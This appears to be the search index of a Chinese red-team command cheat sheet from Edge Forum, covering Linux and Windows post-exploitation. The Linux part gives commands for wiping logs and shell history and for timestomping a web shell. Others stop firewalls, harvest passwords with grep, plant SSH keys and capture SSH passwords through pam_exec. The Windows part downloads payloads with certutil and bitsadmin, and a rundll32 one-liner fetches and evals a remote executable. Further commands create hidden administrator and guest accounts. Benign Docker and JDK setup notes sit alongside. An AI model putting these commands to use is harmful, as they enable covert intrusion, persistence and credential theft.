{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u4ecb\u7ecd \u7ea2\u961f\u547d\u4ee4\u901f\u67e5 \u662f\u7531\u68f1\u89d2\u793e\u533a (Edge Forum) \u6574\u7406\u7684\u5173\u4e8e Red Team \u671f\u95f4\u6240\u5e38\u4f7f\u7528\u7684\u4e00\u4e9b\u57fa\u7840\u547d\u4ee4\u3002 '''+ Edge Team +''' __ _ __ ___ |_ _|(_| _ (_ _ _ __ o _|_ \\/ | _ _ __ |__(_|__|(/_ __)(/_(_ |_| | | |_ / | (/_(_|||| \u76ee\u5f55 Linux \u547d\u4ee4\u901f\u67e5 Windows \u547d\u4ee4\u901f\u67e5 Tools \u547d\u4ee4\u901f\u67e5 mimikatz proxy tools \u540e\u6e17\u900f\u5de5\u5177\u5217\u8868 cobaltstrike \u6570\u636e\u5e93\u547d\u4ee4\u901f\u67e5 mysql sql server oracle postgresql elasticsearch \u611f\u8c22 \u4ee5\u4e0b\u6392\u540d\u4e0d\u5206\u5148\u540e! @loid @r0exper @\u8def\u4eba\u7532 @Upcorn @cxaqhq","title":"\u4ecb\u7ecd"},{"location":"#_1","text":"\u7ea2\u961f\u547d\u4ee4\u901f\u67e5 \u662f\u7531\u68f1\u89d2\u793e\u533a (Edge Forum) \u6574\u7406\u7684\u5173\u4e8e Red Team \u671f\u95f4\u6240\u5e38\u4f7f\u7528\u7684\u4e00\u4e9b\u57fa\u7840\u547d\u4ee4\u3002 '''+ Edge Team +''' __ _ __ ___ |_ _|(_| _ (_ _ _ __ o _|_ \\/ | _ _ __ |__(_|__|(/_ __)(/_(_ |_| | | |_ / | (/_(_||||","title":"\u4ecb\u7ecd"},{"location":"#_2","text":"Linux \u547d\u4ee4\u901f\u67e5 Windows \u547d\u4ee4\u901f\u67e5 Tools \u547d\u4ee4\u901f\u67e5 mimikatz proxy tools \u540e\u6e17\u900f\u5de5\u5177\u5217\u8868 cobaltstrike \u6570\u636e\u5e93\u547d\u4ee4\u901f\u67e5 mysql sql server oracle postgresql elasticsearch","title":"\u76ee\u5f55"},{"location":"#_3","text":"\u4ee5\u4e0b\u6392\u540d\u4e0d\u5206\u5148\u540e! @loid @r0exper @\u8def\u4eba\u7532 @Upcorn @cxaqhq","title":"\u611f\u8c22"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/","text":"Linux \u547d\u4ee4\u901f\u67e5 \u672c\u6b21\u4e0d\u8bb0\u5f55\u547d\u4ee4 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 \u5e38\u7528\u65e5\u5fd7\u6e05\u7406 echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;echo > /var/log/syslog;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok /var/log/btmp \u8bb0\u5f55\u6240\u6709\u767b\u5f55\u5931\u8d25\u4fe1\u606f\uff0c\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u4f7f\u7528last\u547d\u4ee4\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u67e5\u770b /var/log/secure \u8bb0\u5f55\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u542f\u52a8\u540e\u7684\u4fe1\u606f\u548c\u9519\u8bef\u65e5\u5fd7 Web \u65e5\u5fd7\u6e05\u7406 \u76f4\u63a5\u66ff\u6362\u65e5\u5fd7ip\u5730\u5740: sed -i 's/127.0.0.1/192.168.1.1/g' access.log \u6e05\u9664\u90e8\u5206\u76f8\u5173\u65e5\u5fd7: \u4f7f\u7528grep -v\u6765\u628a\u76f8\u5173\u4fe1\u606f\u5220\u9664: cat /var/log/nginx/access.log | grep -v evil.php > tmp.log \u628a\u4fee\u6539\u8fc7\u7684\u65e5\u5fd7\u8986\u76d6\u5230\u539f\u65e5\u5fd7\u6587\u4ef6: cat tmp.log > /var/log/nginx/access.log \u8bbe\u7f6e\u7ec8\u7aef\u4ee3\u7406 export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890 \u67e5\u770b\u7528\u6237\u767b\u5f55\u8bb0\u5f55 last root \u6743\u9650\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237 sudo useradd -m testt && echo \"testt:admin@123\" | sudo chpasswd && sudo usermod -aG wheel testt cURL/wget \u4e0b\u8f7d\u6587\u4ef6 wget -P /tmp/ http://x.x.x.x:8080/shell curl -o /tmp/xxx http://x.x.x.x:8080/shell curl/wget \u53d1\u9001\u6587\u4ef6 curl -X POST --data-binary @file.txt http://localhost:9000 wget --post-file=file.txt http://localhost:9000 curl -T file.txt http://localhost:9000 import socket def start_server(host, port, buffer_size=1024): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.bind((host, port)) server_socket.listen(5) print(f\"\u670d\u52a1\u5668\u6b63\u5728 {host}:{port} \u76d1\u542c...\") while True: client_socket, addr = server_socket.accept() print(f\"\u8fde\u63a5\u6765\u81ea {addr}\") # \u8bfb\u53d6HTTP\u8bf7\u6c42\u5934 request = b\"\" while b\"\\r\\n\\r\\n\" not in request: request += client_socket.recv(buffer_size) headers, file_data = request.split(b\"\\r\\n\\r\\n\", 1) # \u63d0\u53d6\u6587\u4ef6\u540d\uff08\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u6c42\u4fee\u6539\u63d0\u53d6\u65b9\u5f0f\uff09 file_name = \"received_file\" # \u9ed8\u8ba4\u6587\u4ef6\u540d # \u4fdd\u5b58\u6587\u4ef6 with open(file_name, 'wb') as f: f.write(file_data) while True: data = client_socket.recv(buffer_size) if not data: break f.write(data) print(f\"\u6587\u4ef6 {file_name} \u5df2\u4fdd\u5b58\") client_socket.close() if __name__ == \"__main__\": HOST = '0.0.0.0' PORT = 9000 start_server(HOST, PORT) \u6587\u4ef6\u65f6\u95f4\u4fee\u6539 \u4fee\u6539 /www/wwwroot/shell.php \u65f6\u95f4\u4e3a 2024.05.16.24 touch -t 202405161200.24 /www/wwwroot/shell.php \u67e5\u770b DNS \u670d\u52a1\u5668 cat /etc/resolv.conf \u505c\u6b62\u9632\u706b\u5899 systemctl stop firewalld service iptables stop ubuntu: ufw disable \u641c\u7d22\u654f\u611f\u4fe1\u606f find / -regex \".*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.yaml\\|.*\\.sh|.*\\.jsp|.*\\.log|.*\\.txt|.*\\.xml\" | xargs grep -E \"=jdbc:|pass=|passwd=|aliyun|password\" echo \u5199\u6587\u4ef6 //\u76f4\u63a5 echo \u5199\u5165\uff1a echo xxx > /www/xxx.jsp //base64 \u5199\u5165\uff1a echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp //\u8ffd\u52a0 echo xxx >> /www/xxx.jsp \u5728\u7ebf\u7f16\u7801\uff1ahttps://forum.ywhack.com/coding.php \u5199\u5165 ssh \u516c\u94a5\uff1a echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d > authorized_keys //\u4f7f\u7528 printf \u5728\u672b\u5c3e\u5904\u63d2\u5165\uff0c\u5982\u9700\u6362\u884c\u53ef\u6dfb\u52a0\\n //\u53c2\u8003https://baijiahao.baidu.com/s?id=1727019063436737118&wfr=spider&for=pc printf \"ssh-rsa xxx\" >> /root/.ssh/authorized_keys \u538b\u7f29\u6253\u5305\u6587\u4ef6 //\u5c06 /home/mail /home/web \u4e24\u4e2a\u76ee\u5f55\u6253\u5305\u81f3 /tmp \u76ee\u5f55\u4e0b\u547d\u540d\u4e3aweb.tar.gz tar czvf /tmp/web.tar.gz /home/mail /home/web //zip zip -r /tmp/web.zip /home/mail /home/web //\u53ef\u4f7f\u7528 -x \u6392\u9664\uff0c\u5982: zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/* \u5206\u5272\u4e0a\u4f20 split -n 3 fscan //\u5206\u5272\u4e3a 3 \u4e2a\u6587\u4ef6 split -b 500k fscan //\u4ee5 500 K \u5927\u5c0f\u5206\u5272 fscan Windows \u5408\u5e76\uff1a copy /b xaa+xab fscan type xaa xab > fscan Linux \u5408\u5e76\uff1a cat xaa xab > fscan \u5341\u516d\u8fdb\u5236\u83b7\u53d6\u6587\u4ef6 # \u5c06\u6587\u4ef6\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236 xxd -p filename # \u672c\u5730\u8fd8\u539f\uff1a xxd -p -r filename > aa.tar.gz pam_exec \u6293 SSH \u5bc6\u7801 \u9700\u8981\u5173\u95ed SELinux\uff1a setenforce 0 # \u5173\u95ed setenforce 1 # \u5f00\u542f \u4fee\u6539 /etc/pam.d/sshd \u7b2c\u4e00\u884c\u6dfb\u52a0\uff1a auth optional pam_exec.so quiet expose_authtok /tmp/sshd.sh /tmp/sshd.sh: chmod 777 /tmp/sshd.sh #!/bin/sh echo \"$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER\" >> /tmp/123.log Debian/Ubuntu Docker \u5b89\u88c5 Debian 12 / Ubuntu 24.04 \u5b89\u88c5 Docker \u4ee5\u53ca Docker Compose \u5b89\u88c5\u4e00\u4e9b\u5fc5\u8981\u7684\u8f6f\u4ef6\u5305 apt update apt upgrade -y apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates \u52a0\u5165 Docker \u7684 GPG \u516c\u94a5\u548c apt \u6e90 Debian: curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list Ubuntu: curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list \u56fd\u5185\u673a\u5668\u53ef\u4ee5\u7528\u6e05\u534e TUNA \u7684\u56fd\u5185\u6e90: Debian: curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list Ubuntu: curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list \u7136\u540e\u66f4\u65b0\u7cfb\u7edf\u540e\u5373\u53ef\u5b89\u88c5 Docker CE \u548c Docker Compose \u63d2\u4ef6 apt update apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin \u5b89\u88c5 Docker Compose curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 > /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose JDK \u5b89\u88c5 ubuntu18\u8fd0\u884c sudo apt install openjdk-11-jre-headless sudo apt install openjdk-11-jdk \u624b\u52a8 tar -xzvf jdk-13.0.2_linux-x64_bin.tar.gz cd jdk-13.0.2/ pwd vim /etc/profile export JAVA_HOME=/root/jdk-13.0.2 export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/ export PATH=$PATH:$JAVA_HOME/bin source /etc/profile","title":"Linux \u547d\u4ee4\u901f\u67e5"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#linux","text":"","title":"Linux \u547d\u4ee4\u901f\u67e5"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_1","text":"unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0","title":"\u672c\u6b21\u4e0d\u8bb0\u5f55\u547d\u4ee4"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_2","text":"echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;echo > /var/log/syslog;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok /var/log/btmp \u8bb0\u5f55\u6240\u6709\u767b\u5f55\u5931\u8d25\u4fe1\u606f\uff0c\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u4f7f\u7528last\u547d\u4ee4\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u67e5\u770b /var/log/secure \u8bb0\u5f55\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u65e5\u5fd7\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u542f\u52a8\u540e\u7684\u4fe1\u606f\u548c\u9519\u8bef\u65e5\u5fd7","title":"\u5e38\u7528\u65e5\u5fd7\u6e05\u7406"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#web","text":"\u76f4\u63a5\u66ff\u6362\u65e5\u5fd7ip\u5730\u5740: sed -i 's/127.0.0.1/192.168.1.1/g' access.log \u6e05\u9664\u90e8\u5206\u76f8\u5173\u65e5\u5fd7: \u4f7f\u7528grep -v\u6765\u628a\u76f8\u5173\u4fe1\u606f\u5220\u9664: cat /var/log/nginx/access.log | grep -v evil.php > tmp.log \u628a\u4fee\u6539\u8fc7\u7684\u65e5\u5fd7\u8986\u76d6\u5230\u539f\u65e5\u5fd7\u6587\u4ef6: cat tmp.log > /var/log/nginx/access.log","title":"Web \u65e5\u5fd7\u6e05\u7406"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_3","text":"export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890","title":"\u8bbe\u7f6e\u7ec8\u7aef\u4ee3\u7406"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_4","text":"last","title":"\u67e5\u770b\u7528\u6237\u767b\u5f55\u8bb0\u5f55"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#root","text":"sudo useradd -m testt && echo \"testt:admin@123\" | sudo chpasswd && sudo usermod -aG wheel testt","title":"root \u6743\u9650\u521b\u5efa\u7ba1\u7406\u5458\u7528\u6237"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#curlwget","text":"wget -P /tmp/ http://x.x.x.x:8080/shell curl -o /tmp/xxx http://x.x.x.x:8080/shell","title":"cURL/wget \u4e0b\u8f7d\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#curlwget_1","text":"curl -X POST --data-binary @file.txt http://localhost:9000 wget --post-file=file.txt http://localhost:9000 curl -T file.txt http://localhost:9000 import socket def start_server(host, port, buffer_size=1024): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.bind((host, port)) server_socket.listen(5) print(f\"\u670d\u52a1\u5668\u6b63\u5728 {host}:{port} \u76d1\u542c...\") while True: client_socket, addr = server_socket.accept() print(f\"\u8fde\u63a5\u6765\u81ea {addr}\") # \u8bfb\u53d6HTTP\u8bf7\u6c42\u5934 request = b\"\" while b\"\\r\\n\\r\\n\" not in request: request += client_socket.recv(buffer_size) headers, file_data = request.split(b\"\\r\\n\\r\\n\", 1) # \u63d0\u53d6\u6587\u4ef6\u540d\uff08\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u6c42\u4fee\u6539\u63d0\u53d6\u65b9\u5f0f\uff09 file_name = \"received_file\" # \u9ed8\u8ba4\u6587\u4ef6\u540d # \u4fdd\u5b58\u6587\u4ef6 with open(file_name, 'wb') as f: f.write(file_data) while True: data = client_socket.recv(buffer_size) if not data: break f.write(data) print(f\"\u6587\u4ef6 {file_name} \u5df2\u4fdd\u5b58\") client_socket.close() if __name__ == \"__main__\": HOST = '0.0.0.0' PORT = 9000 start_server(HOST, PORT)","title":"curl/wget \u53d1\u9001\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_5","text":"\u4fee\u6539 /www/wwwroot/shell.php \u65f6\u95f4\u4e3a 2024.05.16.24 touch -t 202405161200.24 /www/wwwroot/shell.php","title":"\u6587\u4ef6\u65f6\u95f4\u4fee\u6539"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#dns","text":"cat /etc/resolv.conf","title":"\u67e5\u770b DNS \u670d\u52a1\u5668"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_6","text":"systemctl stop firewalld service iptables stop ubuntu: ufw disable","title":"\u505c\u6b62\u9632\u706b\u5899"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_7","text":"find / -regex \".*\\.properties\\|.*\\.conf\\|.*\\.config\\|.*\\.yaml\\|.*\\.sh|.*\\.jsp|.*\\.log|.*\\.txt|.*\\.xml\" | xargs grep -E \"=jdbc:|pass=|passwd=|aliyun|password\"","title":"\u641c\u7d22\u654f\u611f\u4fe1\u606f"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#echo","text":"//\u76f4\u63a5 echo \u5199\u5165\uff1a echo xxx > /www/xxx.jsp //base64 \u5199\u5165\uff1a echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp //\u8ffd\u52a0 echo xxx >> /www/xxx.jsp \u5728\u7ebf\u7f16\u7801\uff1ahttps://forum.ywhack.com/coding.php","title":"echo \u5199\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#ssh","text":"echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d > authorized_keys //\u4f7f\u7528 printf \u5728\u672b\u5c3e\u5904\u63d2\u5165\uff0c\u5982\u9700\u6362\u884c\u53ef\u6dfb\u52a0\\n //\u53c2\u8003https://baijiahao.baidu.com/s?id=1727019063436737118&wfr=spider&for=pc printf \"ssh-rsa xxx\" >> /root/.ssh/authorized_keys","title":"\u5199\u5165 ssh \u516c\u94a5\uff1a"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_8","text":"//\u5c06 /home/mail /home/web \u4e24\u4e2a\u76ee\u5f55\u6253\u5305\u81f3 /tmp \u76ee\u5f55\u4e0b\u547d\u540d\u4e3aweb.tar.gz tar czvf /tmp/web.tar.gz /home/mail /home/web //zip zip -r /tmp/web.zip /home/mail /home/web //\u53ef\u4f7f\u7528 -x \u6392\u9664\uff0c\u5982: zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/*","title":"\u538b\u7f29\u6253\u5305\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_9","text":"split -n 3 fscan //\u5206\u5272\u4e3a 3 \u4e2a\u6587\u4ef6 split -b 500k fscan //\u4ee5 500 K \u5927\u5c0f\u5206\u5272 fscan Windows \u5408\u5e76\uff1a copy /b xaa+xab fscan type xaa xab > fscan Linux \u5408\u5e76\uff1a cat xaa xab > fscan","title":"\u5206\u5272\u4e0a\u4f20"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#_10","text":"# \u5c06\u6587\u4ef6\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236 xxd -p filename # \u672c\u5730\u8fd8\u539f\uff1a xxd -p -r filename > aa.tar.gz","title":"\u5341\u516d\u8fdb\u5236\u83b7\u53d6\u6587\u4ef6"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#pam_exec-ssh","text":"\u9700\u8981\u5173\u95ed SELinux\uff1a setenforce 0 # \u5173\u95ed setenforce 1 # \u5f00\u542f \u4fee\u6539 /etc/pam.d/sshd \u7b2c\u4e00\u884c\u6dfb\u52a0\uff1a auth optional pam_exec.so quiet expose_authtok /tmp/sshd.sh /tmp/sshd.sh: chmod 777 /tmp/sshd.sh #!/bin/sh echo \"$(date) $PAM_USER $(cat -) $PAM_RHOST $PAM_RUSER\" >> /tmp/123.log","title":"pam_exec \u6293 SSH \u5bc6\u7801"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#debianubuntu-docker","text":"Debian 12 / Ubuntu 24.04 \u5b89\u88c5 Docker \u4ee5\u53ca Docker Compose \u5b89\u88c5\u4e00\u4e9b\u5fc5\u8981\u7684\u8f6f\u4ef6\u5305 apt update apt upgrade -y apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates \u52a0\u5165 Docker \u7684 GPG \u516c\u94a5\u548c apt \u6e90 Debian: curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list Ubuntu: curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list \u56fd\u5185\u673a\u5668\u53ef\u4ee5\u7528\u6e05\u534e TUNA \u7684\u56fd\u5185\u6e90: Debian: curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list Ubuntu: curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor > /usr/share/keyrings/docker-ce.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu $(lsb_release -sc) stable\" > /etc/apt/sources.list.d/docker.list \u7136\u540e\u66f4\u65b0\u7cfb\u7edf\u540e\u5373\u53ef\u5b89\u88c5 Docker CE \u548c Docker Compose \u63d2\u4ef6 apt update apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin \u5b89\u88c5 Docker Compose curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 > /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose","title":"Debian/Ubuntu Docker \u5b89\u88c5"},{"location":"Linux%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/#jdk","text":"ubuntu18\u8fd0\u884c sudo apt install openjdk-11-jre-headless sudo apt install openjdk-11-jdk \u624b\u52a8 tar -xzvf jdk-13.0.2_linux-x64_bin.tar.gz cd jdk-13.0.2/ pwd vim /etc/profile export JAVA_HOME=/root/jdk-13.0.2 export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/ export PATH=$PATH:$JAVA_HOME/bin source /etc/profile","title":"JDK \u5b89\u88c5"},{"location":"Windows%20%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/","text":"Windows \u547d\u4ee4\u901f\u67e5 TCP \u51fa\u7f51\u63a2\u6d4b powershell Test-NetConnection -ComputerName [\u76ee\u6807\u4e3b\u673a\u540d\u6216IP] -Port [\u7aef\u53e3\u53f7] \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6 certutil certutil.exe -urlcache -split -f \"http://127.0.0.1:8080/file.exe\" \"C:/Windows/temp/file.exe\" //\u4ece http://127.0.0.1:8080/ \u4e0b\u8f7d file.exe \u5e76\u4fdd\u5b58\u5230 C:/Windows/temp/file.exe PowerShell powershell -Command \"Invoke-WebRequest -Uri 'https://www.example.com/file.zip' -OutFile 'C:\\Downloads\\file.zip'\" BitsAdmin bitsadmin /transfer \"JobName\" /download /priority normal https://www.example.com/file.zip C:\\path\\to\\save\\file.zip rundll32 rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.3.150/chfs/shared/1Z3.exe\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);} IIS \u7f51\u7ad9\u67e5\u8be2 \u67e5\u770b IIS \u7ed1\u5b9a\u7684\u7f51\u7ad9\uff1a %windir%\\system32\\inetsrv\\appcmd.exe list sites \u67e5\u770b Site ID \u4e3a 1 \u7684\u7269\u7406\u8def\u5f84\uff1a %windir%\\system32\\inetsrv\\appcmd list site /site.id:1 /config | findstr \"physicalPath\" IIS \u914d\u7f6e\u6587\u4ef6\uff1a C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config %SystemRoot%\\System32\\inetsrv\\config\\applicationHost.config \u67e5\u770b Windows \u7cfb\u7edf\u7248\u672c\uff1a wmic os get Caption,osarchitecture \u4fee\u6539\u6587\u4ef6\u65f6\u95f4 powershell -command \"(Get-Item 'C:\\path\\to\\your\\file.txt').CreationTime = '2024-01-01 12:00 AM'; (Get-Item 'C:\\path\\to\\your\\file.txt').LastWriteTime = '2024-01-02 12:00 AM'\" \u8fdb\u7a0b\u64cd\u4f5c \u67e5\u770b\u7aef\u53e3\u5bf9\u5e94 PID\uff1a netstat -ano | findstr :80 \u67e5\u770b PID \u5bf9\u5e94\u7a0b\u5e8f\uff1a tasklist /FI \"PID eq 1234\" \u6839\u636e PID \u67e5\u770b\u7a0b\u5e8f\u6240\u5728\u76ee\u5f55\uff1a wmic process where ProcessId=1234 get ExecutablePath \u6267\u884c\u8fdb\u7a0b\uff1a start /b xxx.exe \u6839\u636e\u540d\u79f0\u7ed3\u675f\u8fdb\u7a0b\uff1a taskkill /f /t /im GotoHTTP.exe \u641c\u7d22\u8fdb\u7a0b tasklist | findstr \"powershell\" Powershell \u65e0\u7a97\u53e3\u6267\u884c EXE powershell -executionPolicy bypass Start-Process -WindowStyle hidden -FilePath 'C:/Windows/temp/rd.exe' net \u547d\u4ee4 \u67e5\u770b\u7528\u6237\u5217\u8868: net user powershell\u67e5\u770b\u7528\u6237\u5217\u8868: Get-WmiObject -Class Win32_UserAccount \u67e5\u770b\u7528\u6237\u7ec4\u5217\u8868: net localgroup \u67e5\u770b\u7ba1\u7406\u7ec4\u5217\u8868: net localgroup Administrators \u6dfb\u52a0\u7528\u6237\u5e76\u8bbe\u7f6e\u5bc6\u7801: net user test P@ssw0rd /add \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup Administrators test /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u6fc0\u6d3bguest\u7528\u6237: net user guest /active:yes \u66f4\u6539guest\u7528\u6237\u7684\u5bc6\u7801: net user guest P@ssw0rd \u5c06\u7528\u6237\u52a0\u5165\u7ba1\u7406\u7ec4: net localgroup administrators guest /add \u5c06\u7528\u6237\u52a0\u5165\u684c\u9762\u7ec4: net localgroup \"Remote Desktop Users\" guest /add \u67e5\u770b\u672c\u5730\u5bc6\u7801\u7b56\u7565: net accounts \u67e5\u770b\u5f53\u524d\u4f1a\u8bdd: net session \u5efa\u7acbIPC\u4f1a\u8bdd: net use \\\\127.0.0.1\\c$ \"P@ssw0rd\" /user:\"domain\\Administrator\" netsh \u64cd\u4f5c\u9632\u706b\u5899 